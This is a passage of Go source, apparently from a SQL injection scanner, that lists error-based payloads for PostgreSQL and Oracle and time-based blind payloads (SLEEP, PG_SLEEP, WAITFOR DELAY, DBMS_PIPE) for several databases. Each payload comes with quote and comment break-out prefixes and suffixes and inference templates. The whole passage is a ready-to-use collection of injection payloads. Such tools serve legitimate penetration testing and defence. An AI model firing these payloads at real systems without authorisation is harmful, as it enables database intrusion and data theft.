			Payload: "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
			},
			Title:  "PostgreSQL OR error-based - WHERE or HAVING clause",
			Vector: "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
			Dbms:   "PostgreSQL",
		},

		// Oracle
		{
			Payload: "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
			},
			Title:  "Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
			Vector: "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
			Dbms:   "Oracle",
		},
		{
			Payload: "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
			Comments: []PayloadComment{
				{Pref: " ", Suf: "-- wXyW"},
				{Pref: "' ", Suf: "-- wXyW"},
				{Pref: "\" ", Suf: "-- wXyW"},
				{Pref: ") ", Suf: "-- wXyW"},
				{Pref: "') ", Suf: "-- wXyW"},
				{Pref: "\") ", Suf: "-- wXyW"},
			},
			Title:  "Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
			Vector: "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
			Dbms:   "Oracle",
		},
	}
}

// GetTimeTests returns timetests payloads
func GetTimeTests() []Payload {
	return []Payload{
		// MySQL
		{
			Payload: "(SELECT(0)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
			Comments: []PayloadComment{
				{Pref: "'XOR", Suf: "XOR'Z"},
				{Pref: "\"XOR", Suf: "XOR\"Z"},
				{Pref: "", Suf: ""},
				{Pref: "'+", Suf: "+'"},
				{Pref: "\"+", Suf: "+\""},
				{Pref: "'OR", Suf: "OR'Z"},
				{Pref: "\"OR", Suf: "OR\"Z"},
				{Pref: "'AND", Suf: "AND'Z"},
				{Pref: "\"AND", Suf: "AND\"Z"},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "MySQL >= 5.0.12 time-based blind (query SLEEP)",
			Vector: "(SELECT(0)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
			Dbms:   "MySQL",
		},
		{
			Payload: "if(now()=sysdate(),SLEEP([SLEEPTIME]),0)",
			Comments: []PayloadComment{
				{Pref: "'XOR(", Suf: ")XOR'Z"},
				{Pref: "\"XOR(", Suf: ")XOR\"Z"},
				{Pref: "", Suf: ""},
				{Pref: "", Suf: "-- wXyW"},
				{Pref: "'AND(", Suf: ")AND'Z"},
				{Pref: "'OR(", Suf: ")OR'Z"},
				{Pref: "\"OR(", Suf: ")OR\"Z"},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "MySQL >= 5.0.12 time-based blind (IF - comment)",
			Vector: "if([INFERENCE],SLEEP([SLEEPTIME]),0)",
			Dbms:   "MySQL",
		},
		{
			Payload: "(SELECT CASE WHEN(1234=1234) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
			Comments: []PayloadComment{
				{Pref: "'XOR", Suf: "XOR'Z"},
				{Pref: "\"XOR", Suf: "XOR\"Z"},
				{Pref: "", Suf: ""},
				{Pref: "'OR", Suf: "OR'Z"},
				{Pref: "'AND", Suf: "AND'Z"},
				{Pref: "'+", Suf: "+'"},
				{Pref: "", Suf: "-- wXyW"},
				{Pref: "\"AND", Suf: "AND\"Z"},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "MySQL >= 5.0.12 time-based blind (CASE STATEMENT)",
			Vector: "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
			Dbms:   "MySQL",
		},
		{
			Payload: "SLEEP([SLEEPTIME])",
			Comments: []PayloadComment{
				{Pref: " AND ", Suf: ""},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "MySQL >= 5.0.12 time-based blind (SLEEP)",
			Vector: "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
			Dbms:   "MySQL",
		},
		// PostgreSQL
		{
			Payload: "(SELECT 1337 FROM PG_SLEEP([SLEEPTIME]))",
			Comments: []PayloadComment{
				{Pref: " AND ", Suf: ""},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "PostgreSQL > 8.1 time-based blind",
			Vector: "(SELECT 1337 FROM PG_SLEEP([SLEEPTIME]))",
			Dbms:   "PostgreSQL",
		},
		// Microsoft SQL Server
		{
			Payload: "WAITFOR DELAY '0:0:[SLEEPTIME]'",
			Comments: []PayloadComment{
				{Pref: " AND ", Suf: ""},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "Microsoft SQL Server/Sybase time-based blind",
			Vector: "WAITFOR DELAY '0:0:[SLEEPTIME]'",
			Dbms:   "Microsoft SQL Server",
		},
		// Oracle
		{
			Payload: "DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME])",
			Comments: []PayloadComment{
				{Pref: " AND ", Suf: ""},
				{Pref: " AND ", Suf: "-- wXyW"},
				{Pref: "' AND ", Suf: "-- wXyW"},
				{Pref: "\" AND ", Suf: "-- wXyW"},
				{Pref: ") AND ", Suf: "-- wXyW"},
				{Pref: "') AND ", Suf: "-- wXyW"},
				{Pref: "\") AND ", Suf: "-- wXyW"},
			},
			Title:  "Oracle time-based blind",
			Vector: "DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME])",
			Dbms:   "Oracle",
		},
	}
}
